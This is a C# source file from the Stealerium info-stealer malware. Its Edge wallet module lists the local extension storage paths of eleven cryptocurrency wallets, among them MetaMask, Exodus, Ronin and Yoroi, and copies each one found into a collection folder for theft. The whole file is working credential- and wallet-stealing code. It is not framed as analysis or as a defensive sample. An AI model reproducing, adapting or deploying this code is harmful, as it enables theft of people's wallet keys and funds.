using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Edge;

internal class Extensions
{
	private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Edge_Auvitas",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"
		},
		new string[2]
		{
			"Edge_Math",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"
		},
		new string[2]
		{
			"Edge_Metamask",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
		},
		new string[2]
		{
			"Edge_MTV",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"
		},
		new string[2]
		{
			"Edge_Rabet",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"
		},
		new string[2]
		{
			"Edge_Ronin",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"
		},
		new string[2]
		{
			"Edge_Yoroi",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"
		},
		new string[2]
		{
			"Edge_Zilpay",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"
		},
		new string[2]
		{
			"Edge_Exodus",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold"
		},
		new string[2]
		{
			"Edge_Terra_Station",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
		},
		new string[2]
		{
			"Edge_Jaxx",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"
		}
	};

	public static void GetEdgeWallets(string sSaveDir)
	{
		try
		{
			Directory.CreateDirectory(sSaveDir);
			foreach (string[] edgeWalletsDirectory in EdgeWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sSaveDir, edgeWalletsDirectory[1], edgeWalletsDirectory[0]);
			}
			if (Counter.BrowserWallets == 0)
			{
				Filemanager.RecursiveDelete(sSaveDir);
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Edge Browser Wallets >> Failed to collect wallets from Edge browser\n" + ex);
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			Counter.BrowserWallets++;
		}
	}
}
